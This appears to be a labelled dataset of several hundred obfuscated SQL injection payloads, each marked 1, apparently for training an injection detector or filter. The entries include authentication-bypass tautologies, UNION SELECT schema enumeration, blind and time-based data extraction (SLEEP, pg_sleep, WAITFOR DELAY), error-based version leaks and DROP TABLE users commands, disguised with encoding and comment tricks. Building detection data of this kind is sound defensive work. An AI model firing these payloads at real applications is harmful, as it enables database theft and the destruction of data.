"1'/**/AND/**/substring(database(),/**/1,/**/1)/**/>=/**/'s'/**/--", 1
"test%u0027OR", 1
"%u00271%u0027%09IN(1)%u00271%u0027/*", 1
"'%09%09%09%09OR%09%%309%09%09EXISTS(S%45LECT%09%09%0%39%091%%30%39%09%09%09FROM%09%0%39%0%39%09users)--", 1
"1'AndS%75bSt%72Ing(DaT%61ba%73E(),/*%0d%0a*/1,1)	=%09's%27--", 1
"%u0027/*!12345*/UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020--%u0020", 1
"1%27%20oR%20asCiI%28SuBsTRInG%28DATABAse%28%29%2C%201%2C%201%29%29%20%3E%20100%20--", 1
"1%27%20aNd%20sUBSTriNg(daTAbase(),%201,%201)%20%3D%20%27s%27%20/*!*/oR 'B'='b'--", 1
"test%27%2F%2A%2A%2FOR%20%271%27%3D%271%27%20%2F%2A%20%23%20more_noise", 1
"WAITFOR DELAY '0:0:5'--#oddca", 1
"1%27%20A%4eD%20substring(databas%65%28),%201,%201%29%20%3D%20%27s%27%20--", 1
"1'UNIONSELECTtable_name,null,nullFROM/*%0d%0a*/information_schema.tables--%0d%0a", 1
"'/**/|| '1'='1", 1
"TEST%27%2F%2A%2A%2FoR%2F%2A%2A%2F%271%27%3D%271%27%2F%2A%2A%2F--%2F%2A%2A%2F%23genze", 1
"' OR EXISTS(SELECT 1 FROM users)----ayrf5n", 1
"%27/**/A%4eD/**/1=1/**/--/**/", 1
"%3B%2509%2509%250%2539SELECT%2509%2509%2509%2570g_sl%2565ep%285%2529%3B%2509%2509%2509----l%2566kqm3%256bznk75", 1
";/%2a*/DROP TABLE use%72s;%20--", 1
"%27%20O%52%2%301%3D1%20--%20", 1
"%27%20OR%20%271%27%3D%271 || (1=1)(1)", 1
"admin'%20OR%20'1'%09=%20'1--9yqzzpbpsnjw5", 1
";/*!*/dRop/**/TaBLE/**/uSErS;/**//**/#/**/moRE_nOIsE--", 1
"1%27%20OR%20AsCii(SUBsTRIng(daTABaSe(),%201,%201))%20%3e%20100%20--", 1
"'/**/AND 1=convert(int,@@version)----vnv2ysik", 1
"'/*!12345*/AND1=1%0d%0a--random_noise--%0a--gstcc04vuz872d", 1
"'/*!*/AnD 1=convErt(inT,@@verSIon)--", 1
"test'/**/     OR      '1'LIKE'1'      /*      --      random_noise", 1
"1%u0027%u0020O/*!*/R%u0020ascii(substring(database(),%u00201,%u00201))%u0020%3E%u0020100%u0020--", 1
"1))%u0020uNIoN%U0020SelEcT%u00201,dAtabAsE(),3--", 1
"' UNION SELECT 1,2,3--#8ywrl0jer", 1
";  DROP  TABLE  users;  --", 1
"1%2%39%20UNION%20SELEC%54%20%31%2Cdatabase%28%29%2C3-%2d--ja%710tkqv%6c88l", 1
"1'/**/OR/**/IF(substring(database(),/**/1,/**/1)>='a',/**/SLEEP(5),/**/0)/**/--", 1
"%u0027%20%20%20%20%20UN/**/ION%20%20%20%20%20SELECT%20%20%20%20%201,2,3--", 1
"test' OR '1'<='1' /*--b01ds", 1
";/*!*/DROP%20TABL%45%09%09%09users;%09%09%09-%2d", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020--%u0020--i97a569", 1
"'AND%0d%0aextractvalue(1,concat(0x5c,version()))--/*%0a*/", 1
"1'  UNION  SELECT  table_name,  null,  null  FROM  information_schema.tables    #  more_noise--", 1
"ADMIN'/*!12345*/OR '1'LIKe'1--Su8CXt", 1
"%27/%2a*/OR/**/1<=1/**/--/**%2f", 1
"test'			||			'1'%20=%09'1'			/* /*!*/AND 1=1", 1
"test%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0027%u0020/*", 1
"1)) unIon sElEcT 1,daTabaSE(),3--", 1
"%27%2%30aND%20ExtRaCTVAlUe%281%2ccO%6Ec%61T%280x5C%2CvE%72SI%6fN%28%29%29%%329--", 1
"1' XOR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --", 1
"'/*!*/%41ND %31<=conv%65rt%28int,@@versio%6e) OR (1)--", 1
"1' U%4eION SELECT %74able_name,%20null, null FROM in%66o%72%6da%74ion_schema.%74ables --", 1
"a%64min' O%52 '1'='1", 1
"%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3D%271--qq2snp4bh9c", 1
"%27%20uNION%20sELeCT%20NULl,%20NUll,%20nuLL%20--%20", 1
"%27%20aNd%201%3DCONveRt(InT,@@verSIon)--", 1
"1%27ANDsubstring(database(),1,%0a1)/*%0a*/%3D%27s%27--%0a#dsg6b", 1
"test'			OR			'1' = '1'						/*!*/AND			1 = 1--			--7egaf", 1
"1) UNION SELECT 1,database(),3 /*!*/AND 1=1----a5mzr1uv1m5", 1
"1' O%52 ascii(s%75b%73tring(database(), %31, 1)) > %3100  OR (1)--", 1
";%20sEleCt%20PG_SLEeP(5);%20--", 1
"test'OR", 1
"'1'>='1'/*%0d%0a*//*/*%0d%0a*/", 1
"%27%%320UNI%4f%4e%20SELECT%20null%2C%20null%%32C%20null%20-%2d%20--m2qzt9ntdylikx", 1
"%u0027%U0020Or%u00201LIKE1%U0020--%u0020", 1
"admin%27%20OR%20%271%27%3D%271 OR (1)#hgtjir04", 1
";DROP%0aTABLEusers;--%0d%0a", 1
";%20DROP%20TABLE%20users;%20/**/OR/**/(1)--", 1
"1' or aScII(SUBSTRIng(DATabASe(), 1, 1)) > 100 --", 1
"admin%27/**/OR%20%271%27%3D%271", 1
"1%20aND%201liKe1--ohYZQO6fwgYq", 1
"1%27%2F%2A%2A%2FAND%2F%2A%2A%2Fsubstring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%2F%2A%2A%2F%3D%2F%2A%2A%2F%27s%27%2F%2A%2A%2F--#06a506667bw959", 1
"1%27%20OR%20IF%28%73ub%73tring(database(),%201,%201)%3D%%327a%27%2c%2%30%53LEEP(5),%200)%20--", 1
"; DROP TABLE users;  O%52 'b'=%27b'--#r9%70h%6bhh%3750ja490", 1
"' UNION SELECT 1,2,3----sh3sgd03vvi", 1
"1)%u0020%55N%49ON%u0020S%45LECT%u00201,database(%29,3%2d-", 1
"%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3E%3D%271--r6naf7l3hjxz", 1
"%u0027aND/*%0d%0a*/1=ConVeRt(InT,@@versioN)--", 1
"", 1
"'%20AND%201=%0d%0a", 1
"1%20--%20/*%0a*/", 1
"1%20aNd%201%3D1#AXbwksGiBKX", 1
"'/*!*/AND          1  =  1          --          --l3r478sgau163", 1
"%27%09%09%09%09%09UNION%09%09%09%09%09SELECT%09%09%09%09%091%2C2%2C3--", 1
"%27%20Or%20%271%27%3E%3D%271#6iSN2", 1
"%27%20||%201%3D1%20--%20--p5vs437gq", 1
"'OR/*%0d%0a*/1/*!*/=  1/*%0d%0a*/--/*%0a*/", 1
"test%27%20%7C%7C%20%281%3D1%29%271%27%3D%271%27%20%2F%2A", 1
"1))		UNiOn		SelECt		1,%44ATABASE(%29,3%2d%2d", 1
"1'UNIONSEL%45%43Ttable_nam%65,%6eull,%0d%0anullFR%4fMinf%6f%72mat%69on_schema.tables", 1
"--", 1
"ad%6din%27%20OR%20%271%2%37%%33D%271", 1
"%27/*!*/ANd%20ExtRACTVALUE(1,cONCAT(0X5C,VErSion()))----5QBi3kyvErHt", 1
"1))/*!*/UNION/**/SELECT/**/1,database(),3--", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20--%23c5n4tu2", 1
"1' UNIO%4e SELECT table_name, null,%20n%75ll FRO%4d%20info%72ma%74ion_sch%65ma.tables --", 1
"'/**/AND/**/e%78tractvalue(%31%2c%63onca%74(0x5c,%76ersion()))/**/OR%2f**/(1)--", 1
"1%29 UNION SELECT 1,datab%61se(),%33-%2d", 1
"test' OR '1'>='1' --", 1
"%31%27 %55NION SEL%45CT ta%62%6ce_name, null, null FROM information%5fschema.tables -%2d", 1
"test'O/*!*/R", 1
"'1'LIKE'1'%0d%0a/*", 1
"#07xp55jkrmq", 1
"1))/**/UNION/**/SELECT/**/1,%64atabase()%2c3/**/--%20random%5fno%69se--#2%655e8", 1
"%3BSELECT%250apg_sleep%285%29%3B%2F%2A%250d%250a%2A%2F--%250a", 1
"'/**/&&/**/(1=1)1=convert(int,@@version)--", 1
"test%u0027/*!12345*/||%u0020(1=1)%u00271%u0027=%u00271%u0027%u0020--%u0020#urgfzoeabp5na", 1
"%27%20OR%201%3D1%20--%20--05bwx91", 1
"1'/**/oR/**/iF(sUbSTrIng(DatABaSE(),/**/1,/**/1)%09=%20'a',/**/sLeEP(5),/**/0)/**/--", 1
"%27%20OR%201%3D1%20%20%23%20more_noise--%20#03k72a4phov", 1
"'/**/&&/**/(1<=1)1=1/**/--/**/--8tlepnay0qbc11t", 1
"%u0027%09%09%09%09UNION%09%09%09%09SELECT%09%09%09%091,2,3--", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29%20--%20random_noise--", 1
"1/*!12345*/&& 1=1--bz0zhdh6gbagbc", 1
"tEsT%u0027/**/||/**/(1=1)%u00271%u0027=%u00271%u0027/**//*", 1
";/*!12345*/SE%4cECT%20%20%20pg_%73lee%70(5);%20%20%20%2d%2d", 1
"1)/**/UNION SELECT 1,database(),3 -- random_noise--", 1
"' OR 1=1 -- --wv34grou", 1
"%27aNd%0AExTrACtVALUE(1,ConCAT(0X5c,VERSIoN()))--", 1
"1%27%09%09%09%09UNION%09%09%09%09SELECT%09%09%09%09table_name,%09%09%09%09null,%09%09%09%09null%09%09%09%09FROM%09%09%09%09information_schema.tables%09%09%09%09--", 1
"1' aND sUBstrING(dATAbAse(), 1, 1) = 'S'  # more_noise--", 1
"ADmIn%u0027/*!12345*/oR%u0020%u00271%u0027=%u00271--ETEy7MZs7D6PI", 1
"%27%20UN/*!*/ION%20SELECT%20null,%20null,%20null%20--%20#24nf1", 1
"%3B%2520dRoP%2520tAble%2520users%3B%2520--", 1
"1' OR IF(substring(database(), 1, 1)<='a', SLEEP(5), 0) ----212jh8z9k", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29%20AND%20%27a%27%3D%27a%27--", 1
"1'/*!12345*/%41ND/**/%73ubstring(database(%29,/**/1,/**/1)/**/%3d/**/'s'%20--", 1
"%27%20A/*!12345*/ND%201%3D1%20--%20", 1
"test%u0027OR", 1
"%u00271%u0027=%u00271%u0027--%0a%0a", 1
"%27%20A/*!12345*/ND%201%3Dconvert(int,@@version)----qb4lgk82i9ze", 1
"1' XOR IF(s%75%62%73tring(database(), 1,%201)>='a',%20%53LEEP(5), 0) --", 1
"admin%u0027%u0020OR%u0020%u00271%u0027%09=  %u00271--z3467pvt76gb", 1
"1%u0027ANDsubstring(database(),%0d%0a1,1)%20=%u0027s%u0027 -- random_noise--", 1
"1))%u0020UNION%%750020SELECT%u00201,da%74a%62ase()%2c3%2d---9798b0%67", 1
"%3B%2F%2A%2a%2FdrOp%2F%2a%2A%2FtabLE%2F%2A%2A%2FuseRS%3b%2F%2A%2A%2F--", 1
"WAITFORDELAY%250a%270%3A0%3A5%27--", 1
"'%20UNION%20SELECT%201,2,3--", 1
"admin%u0027O/*!*/R/*%0a*/%u00271%u0027%u0020=%09%u00271", 1
"", 1
"WaItfOr%20delAY%20%270%3A0%3A5%27--", 1
";%u0020SELECT%u0020pg_sleep(5);%u0020 OR (1)--", 1
"%27%20AND%201%3D1%20 OR 'b'='b'--%20", 1
"1' UN%49ON SELECT table_%6eame%2c n%75l%6c, null FROM inform%61tion_schema.t%61bles  # %6dore_nois%65--", 1
"%u0027%u0020AN%44%u0020%31=convert%28i%6et,@@version)--#0uy8tll0vgfvz", 1
";/*!12345*/ DROP  TABLE  users;  --", 1
";SEL/**/ECTpg_sleep(5);%0a--", 1
"%27%20UNION%20SELECT%201%2C2%2C3 OR 'b'='b'--", 1
"test%u0027/**/OR%u0020%u00271%u0027=%u00271%u0027%u0020/*", 1
"%27/*!12345*/AND/**/1%3Dconvert(int,@@version)--", 1
"admin'O/*!*/R/*%0a*/'1'LIKE'1", 1
"OR 'b'='b'", 1
"%27/*!12345*/union%20SeLeCT%201,2,3--#mKM30", 1
"WAITFO/*!*/R%20%20DELAY%20%20%270:0:5%27--", 1
"admin%u0027%u0020OR%u0020%u00271%u0027 =  %u00271 AND 'a' =  'a'--c6o9mb2ippsr8c", 1
"admin'%09%09%09OR%09%09%09'1'  =  '1", 1
"'/**/UN%49O%4e/**/SELE%43T/**/null,/**%2fnull,/**/nul%6c/**/ OR (1)--/%2a%2a/--kivzr16ufj25", 1
"admi%6e%27%20OR%20%%3271%27LIKE%27%31", 1
"1 and %31=1--f9Lt843%598%59L5gr2", 1
"%27/*!12345*/OR%20EXISTS(SELECT%201%20FROM%20users)--", 1
"test%27 OR '1'='1'%20-%2d", 1
"'					AnD					1%20=%201					--					--x42r5w8xtwc", 1
"1))				unIoN				sElect				1,dATAbAse(),3--", 1
"admin%27%20OR%20%271%27%3E%3D%271 AND 'a'='a'", 1
"%27%20OR%20%271%27%3D%271--4wbalklhq30rxe5", 1
"1	AND	1%09=	1", 1
"1)/*!12345*/UNION     SELECT     1,database(),3--", 1
"%27%20%20AND%20%201%2520%3D%2509convert%28int%2C%40%40version%29--", 1
"WAIT%46OR DEL%41Y '0:0:5'%2d-", 1
"1%27OR%0AIF%28substring%28database%28%29%2C1%2C%0A1%29%3D%27a%27%2C%2F%2A%250a%2A%2FSLEEP%285%29%2C0%29%20--%20random_noise--", 1
"' UNION SELECT %31%2c2,3-%2d", 1
"%27OR/*%0a*/%271%27%3D%271%0a", 1
"%u0027%u0020&&%u0020(1=1)%31=1%20--%u0020", 1
"%3B%20DROP%20TABLE%20users%3B%20----v47k2arv", 1
"%2527%2F%2A%2112345%2A%2FUNION%2520SELECT%2520null%2C%2520null%2C%2520null%2520%20OR%20%281%29--%2520", 1
"'OR/*%0d%0a*/EXISTS(SELECT1%0aFROMusers)%0aAND'a'='a'--#0pt5erg", 1
"teST'XOr/*%0d%0a*/'1'='1'/*/*%0d%0a*/#mOrE_nOISE/*%0d%0a*/", 1
"'AND%0aextractvalue(1,concat(0x5c,version()))----2hixdvkc", 1
"; DrOP tABLe useRS; --", 1
"%3B%20DRO%50%20TABL%45%20users%%33B%20--", 1
"1'%20%20%20OR%20%20%20IF(substring(database(),%20%20%201,%20%20%201)%20IN/**/(1)%09'a',%20%20%20SLEEP(5),%20%20%200)%20%20%20--#wau7xp1v", 1
";DROP%20TABLE%20users;", 1
"%2d-/*%0d%0a*/", 1
"'/*%2a%2fUN/*!12345%2a/I%4fN/**/SELECT/%2a*/1,2,3--", 1
"WAITFORDELAY%2F%2A%250a%2A%2F%270%3A0%3A5%27--%250a", 1
"admin%u0027%u0020||%u0020%u00271%u0027=%u00271 OR (1)", 1
"'/**/OR/**/EXISTS(SEL/**/ECT/**/1/**/FROM/**/users)--", 1
"1AND1=1/*%0a*/", 1
"WAITFOR%20DELAY%20%270%3A0%3A5%27--%2349wu1l5", 1
"1)) UNiON SeLeCt 1,DATAbasE(),3 OR 'b'='b'--", 1
"' && extractvalue(1,concat(0x5c,version())) || (1=1)(1)--", 1
"1' OR aSCII(SUBStrING(DatabAse(), 1, 1)) > 100  oR 'b'='b'--", 1
"'oR1=1", 1
"%2d-", 1
";%u0020%u0020SEL/*!*/ECT%u0020%u0020pg_sleep(5);%u0020%u0020--", 1
";%20DROP%20TABLE%20users;%20%u0020--%u0020random_noise--", 1
"1%27%2F%2A%2A%2FAND%2F%2A%2A%2F%2573Ub%2573tRinG%2528d%2561TaBaSE%2528%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%2F%2A%2A%2F%3D%2F%2A%2A%2F%27S%27%2F%2A%2A%2F--", 1
"1%27/*!*/AND%20s%75%62string(da%74abase(),%201,%201%29%20%3D%20%27s%27%20--", 1
"%27%20OR%201%3D1%20--%20--kw6ldn4", 1
"test'/**/OR/**/'1'IN/**/(1)'1'/**/--/**/#0qan1kld", 1
"'/*!12345*/AND/**/1=1/**/--/**/--ut9ix04", 1
"' AND 1=convert(int,@@version)----epsno", 1
"test%27O%2f*!12345*/%52'1'>='1'/*%0d%0a*%2f/*", 1
"1%27/**/or/**/ASCIi(subSTrING(datAbAse(),/**/1,/**/1))/**/%3E/**/100/**/%20--%20random_noise--", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020--%u0020--v41rh", 1
"test%27OR%271%27%3D%271%27--/*%0a*/%0a", 1
"%27%20%20%20%20%20UNION%20%20%20%20%20SELECT%20%20%20%20%201%2C2%2C3--", 1
"1%27%20OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20%20AND%20%27a%27%3D%27a%27--", 1
"tes%74%27OR%271%27%3D%271%27", 1
"--%0%61", 1
";%u0020SEL/*!12345*/ECT%u0020pg_sleep(5);%u0020--", 1
"Test%27%20oR%20%271%27%3D%271%27%20/*", 1
"'%09%09%09%09AND%09%09%09%091%09= convert(int,@@version)--", 1
"1%27ORascii(substring(database(),1,1))%3E100%0a--#jei6ixm3ie1ljb", 1
"test%27%20O/*!*/R%20%271%27%3D%271%27%20%20AND%20%27a%27%3D%27a%27--%20", 1
"'unioNsELEct1,2,3--/*%0a*/", 1
"%27%2F%2A%2A%2FAND%2F%2A%2A%2F1%3D1%2F%2A%2A%2F--%2F%2A%2A%2F--moa9ey6uabr", 1
"%u0027%u0020UNION%u0020SELECT%u00201,2,3----df81co6v2xhbd", 1
"1%25u0%253020%2541ND%25u00201%3D1", 1
"ADMIn'  OR  '1'	=%20'1 OR 'b'='b'#csU3JQLb66IZ78", 1
"1%27%2%30UNION%20%53ELECT%20table_na%6de%2C%20null%2C%20n%75ll%20FROM%2%30inform%61tio%6e_schema.%74abl%65s%20----m9oze8", 1
"'/*!*/|| E%58ISTS(SELECT %31 FROM us%65rs)%2d-", 1
"1'	OR	IF(substring(database(),	1,	1)%09=", 1
"'a',	SLEEP(5),	0)	--/*%0d%0a*/", 1
"aDMIN%27%20Or%20%271%27%3D%271#50yh9", 1
";%%550020%64%72Op%U0020tablE%U%30020USers;%U0020--", 1
"1'UNIONSELECTtable_name,null,nullFROM%0d%0ainformation_schema.tables/*%0d%0a*/--", 1
"1%27%20&&%20(1%3D%31)substrin%67(database(),%201,%20%31)%20%3D%20%27s%27%20--", 1
"%27AND%2F%2A%250a%2A%2Fextractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--%0A", 1
"%27/*!12345*/or1%3D1/*%0d%0a*/--/*%0a*/%0d%0a", 1
"1))UNION%0aSELECT1,d%61ta%62ase(%29,3-%2d", 1
"", 1
"1%27%20AND%20subStRINg(DatAbaSE(),%201,%201)%20%3D%20%27S%27%20--", 1
"; drop Table uSers; --", 1
"'OR1IN%0d%0a(1)1--/*%0d%0a*/", 1
"test'/*!*/|| '1'='1' /*", 1
"admin%27%20OR%20%271%27%3D%271#ay3ea", 1
"1%27%20oR%20aScIi%2528sUBsT%2572ING%28dataBASE%28%2529%2c%201%2c%201%2529%29%20%3E%20%253100%20--", 1
"test'OR%0a'1'='1'--", 1
"'/**/UNION SELECT 1,2,3--", 1
"'/*!12345*/ANDextractvalue(1,concat(0x5c,version()))--%0d%0a", 1
"%27%20AND%201%3Dc%6fn%76%65r%74%28in%74%2C%40%40version%29--", 1
"1' XOR %73u%62stri%6eg(dat%61base(), 1, %31) = 's' --", 1
"%27%2F%2A%2A%2FOR%201%3D1%20--%20", 1
"waITfOR%2520%2520%2520%2520%2520dELaY%2520%2520%2520%2520%2520%25270%3A0%3A5%2527--", 1
"1)) %55nioN sELEct 1,%44At%61ba%53e(),3 OR 'b'='b%27--#0CYpBx9%58zWHVPX", 1
"%31) UNION SELEC%54 1,d%61tabase(),3-%2d # more_noise--2mdkagwjv7m9on", 1
"%3B%2F%2A%2A%2FDROP%20TABLE%20users%3B%20--", 1
"'/*!12345*/UNioN seLeCt NULl, nuLl, NulL --", 1
"%%327%20AND%20ext%72%61ctvalu%65%2%381%2Cconcat%280x5c%2%43version%28%29%29%29--", 1
"1%27%20%7C%7C%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20--", 1
"%27%20OR%201%3D1%20--%20#sfqy2frvaot4", 1
";DROP%0d%0aT%41BLE/*%0%61*/users;/*%%30a*/-%2d", 1
";drOpTABLE/*%0A*/USERS;%0A--/*%0A*/#2Uf036YWN12", 1
"%27%20UNION%%320SELE%43T%201,%32,3 AND 'a'='a'--", 1
"'%09%09%09OR%09%09%091  =	1%09%09%09%09%09%09--%09%09%09random_noise--%09%09%09", 1
"' OR '1'LIKE'1 AND 'a'='a'", 1
"1' %4fR IF(s%75bstr%69ng(datab%61se(), 1, 1)	=  'a'%2c SL%45EP(5), 0) %2d-", 1
"%27%20UNIoN%20SelEct%201,2,3--", 1
"test'		XOR		'1'%20=%20'1'		--", 1
"; DROP TABL%45%20user%73; --", 1
"1%27/**/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/%20--%20random_noise--", 1
"1) UNION SELECT 1,database(),3 /*!*/AND 1=1----z1cfq0t", 1
"1%2%37UNIONSELE%43Ttable_%6eame%%32Cn%75ll%2CnullFROMi%6efor%6datio%6e_schema.tables%20%4fR%20%27b%27%3D%27b%27--%250a", 1
";/**/drop%20TABlE%20usErS;%20--", 1
"1%29%2F%2A%2A%2FUN%2F%2A%2112345%2A%2FION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2Cdatabase%28%29%2C3--", 1
"%27O/*!12345*/R%271%27%20%3D%20%20%271%0d%0a", 1
"1%27%20OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20--#278jqo0r7", 1
"; DroP tabLE UsErs; --", 1
"1'OR/*%0d%0a*/ascii(substring(database(),1,1))>100--", 1
"1))UNIONSELECT1,database(),3--/*%0d%0a*/", 1
"%27And%2F%2A%250d%250a%2A%2F1%3D1%20AND%20%27a%27%3D%27a%27--%0A", 1
"%27%20oR%20ExIstS(SeLecT%201%20frOM%20UsERs)--", 1
"'/*!12345*/UniON SElect NulL, nulL, nUlL --", 1
"'/*!*/UNIONSELECT%0d%0a1,2,3--%0a", 1
";/**/%u0020%u0020%u0020%u0020%u0020%u0020%u0020DROP%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020TABLE%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020users;%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020--", 1
"'Or/*%0a*/'1'='1/*%0d%0a*/", 1
"1%27%2520%2520%2520%2520%2520A/*!12345*/ND%2520%2520%2520%2520%2520substring%28database%28%29%2C%2520%2520%2520%2520%25201%2C%2520%2520%2520%2520%25201%29%2520%2520%2520%2520%2520IN%2520%2520%2520%2520%2520%281%29%2520%2520%2520%2520%2520%27s%27%2520%2520%2520%2520%2520--", 1
"test%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0027%u0020/*%u0020OR%u0020(1)", 1
"%25u0027%25u0020OR%25u00201%3E%3D1%25u0020--%25u0020", 1
"%27%20AND%20extract%2576%2561lue%281%2Cconcat%280x5%2563%252cversion%28%29%29%29%252d- OR 'b'='b'", 1
"1%27%20UNION%20SELECT%20table_name%2C%20n%2575ll%252c%20null%20FROM%20%2569nf%256frmati%256fn_s%2563hema%252etables%20-%252d", 1
"%u0027%u0020A%4eD%u00201=%63onvert(int,@@v%65rsi%6fn)--#3o1v2", 1
"1%29%29%2520UNION%2520SELECT%25201%2Cdatabase%28%29%2C3--", 1
"test'/**/O/*!*/R/**/'1'='1'/**/--/**/--zo0kcrnxginawu", 1
"test%u0027%u0020||%u0020%u00271%u0027=%u00271%u0027%u0020--%u0020#6m5uia", 1
"'/*!12345*/ANDextractvalue(1,concat(0x5c,version())) OR (1)--%0d%0a--1l3q4z", 1
"'%20UNION  SELECT  1,2,%33%2d-", 1
"' && 1LIKEconvert(int,@@version)----cef2sl8y7ft3v", 1
"1' anD suBStRIng(dAtABAse(), 1, 1) = 'S' --", 1
"%u0027%u0020OR%u0020EXISTS(SELECT%u00201%u0020FROM%u0020users) /*!*/AND 1=1--", 1
";/**/SELECT pg_sleep(5); ----cas4r", 1
"1'&&(1=1)substring(database(),1,1)/*%0a*/='s'--", 1
"test%27%2F%2A%2112345%2A%2FOR%20%271%27%3D%271%27%20--%20", 1
"1'/**/OR/**/IF(substring(database(),/**/1,/**/1)<='a',/**/SLEEP(5),/**/0)/**/----ne4h6y", 1
"1%u0027%u0020%u0020OR%u0020%u0020IF(substring(database(),%u0020%u00201,%u0020%u00201)%u0020%u0020%3D	%u0027a%u0027,%u0020%u0020SLEEP(5),%u0020%u00200)%u0020%u0020--", 1
"WAITFOR%u0020DELAY%u0020%u0027%30%3a%30:5%u0027--", 1
"%27%20anD%201%3DconVeRT(int,@@vERSIon) /*!*/AND 1=1--", 1
"1					And					1%09=1", 1
"", 1
"' OR '1'='1#wrpjfu55ay9hp1q", 1
"'/**/unIOn/**/selEct/**/NUlL,/**/nuLl,/**/nuLl/**/ # more_noise--/**/", 1
"'/**/XOR/**/1=1/**/--/**/#nwfmsdsbo6y", 1
"test'OR", 1
"'%31'='1'/*%0d%0%61*/--%2f*%%30a*/", 1
";/**/DROP%20TABLE%20users;%20--", 1
"1' || IF(substring(database(), 1, 1)IN (1)'a', SLEEP(5), 0)  OR 'b'='b'--", 1
"' uNION%20sElECT nULl,%20n%55lL,%20Null %2d- #9ewdnsm", 1
"1%25u0020AND%25u00201%3D1 OR (1)", 1
";%20SELECT%20pg_sleep(5);%20--#lpsglzktm", 1
"%2527%2520OR%2520%25271%2527%253D%25271 AND 'a'='a'", 1
"%U0027%U0020ANd%u00201=coNvERt(int,@@VerSiOn)--", 1
"%31' %4fR ascii(substring(database%28),%201, 1)) > 10%30 --", 1
"WAITF%4fR DELAY%20'0%3a0:5'--#ylm8ojx", 1
"admin%27/**/XOR/**/%271%27%3D%271 AND 'a'='a'", 1
"; DrOP TaBLE uSERS; --", 1
"1)/**/uNioN/**/sELECT/**/1,DatabasE(),3--", 1
"%27/**/And/**/1%3D1/**/ or 'b'='b'--/**/", 1
"1' uniOn SeLECT tABle_nAme, nUlL, nuLL froM inFORmation_scHEMa.tabLEs --", 1
"WAITFOR%20DELAY%20%270%3A0%3A5%27----olwof", 1
"'/**/%4fREXIS%54%53(S%45LECT1/*%0a*/%46ROMusers)--/*%0d%0a*/", 1
"'uniOnseLect%0a1,2,3--", 1
"1'/**/uNION SeLEcT taBle_namE, NuLl, nUll FRom InfORMatIOn_scHeMa.tABLes ----ua03740", 1
"1))%u0020UNION%u0020SELECT%u00201,database(),3----wo55up", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)>%20=	%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--", 1
"1A/*!*/ND/*%0d%0a*/1=1", 1
"%3B%2520DROP%2520TABLE%2520users%3B%2520--", 1
"'/**/A/**/ND/**/1=1/**/--/**/", 1
"1)/**/%55NION/**/SELECT/**/1,%64ata%62ase(),3%2d-", 1
";		SELECT		pg_sleep(5);		--", 1
"'%20%20%20OR%20%20%20'1'%20=%09'1", 1
"1' aNd sUBstRIng(dATAbaSE(), 1, 1) = 'S' --#tfx48tbd", 1
"1'/**/oR/**/AsCiI(sUbStRiNG(DAtAbasE(),/**/1,/**/1))/**/>/**/100/**/--", 1
"test%u0027%u0020||%u0020%u00271%u0027=%u00271%u0027%u0020--%u0020", 1
"'/**/OR 1=1 -- --3v6xalhkgwzdilp", 1
"admin%27/**/OR/**/%271%27%3D%271", 1
"WAIT%46OR DELA%59 '0%3a0:5'--", 1
"1))%09%09%09%09%09UNioN%09%09%09%09%09SeLECT%09%09%09%09%091,dAtABaSe(),3 Or 'B'='b'--", 1
"admin'/**/OR/**/'1'='1#/*%0a*/more_noise%0d%0a--o4ph4aojdbzr", 1
"WaItfoR%20DeLAY%20%270:0:5%27--", 1
"WAITFO/*!*/R/**/DELAY/**/%270:0:5%27--#dz5in6usxgh", 1
"%3b    SELE%43T    pg_sleep(5%29;    --", 1
"1'/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/--#c1b8gl5", 1
"'    AND    1>%20=%201        OR    (1)--    --h3epsqr1h", 1
"%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2F%2A%2A%2F--%2F%2A%2A%2F%236vvefn2drt5ew2", 1
"%u0027%u0020anD%u0020extRACtVAlue(1,CONcAT(0X5C,vErsioN()))--", 1
"1				AND				1  =	1", 1
"%57AITFORDE%4cAY%270:0:5'--", 1
"", 1
"' Or '1'='1", 1
"admin%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%2509%3D%09%271 -- random_noise", 1
"1%27%20uNioN%20selecT%20tAbLE_name,%20NuLl,%20NulL%20FrOM%20inFOrMATiOn_SchemA.TAblEs%20%20AND%20%27A%27%3d%27A%27--", 1
"%27%20%7C%7C%20%281%3D1%291%3D1%20--%20", 1
"1'UNIONSELECTtable_name,null,nullFROMinformation_schema.tables/*%0d%0a*/--#p4eamawsu9z", 1
"%27%u0020O%52%u00201=1%u0020--%u0020", 1
"'/**/AND 1=convert%28int,@@vers%69on%29%2d-", 1
"%74est' OR '1'='%31' /*", 1
"1) UNION SELECT 1,database(),3----ufwnxvhzwlw3", 1
"%27%20AND%201%3Dconv%65%72t%28int,@%40version)--", 1
"1AND", 1
"1%3d1/*%0a*/#i526osg784309a", 1
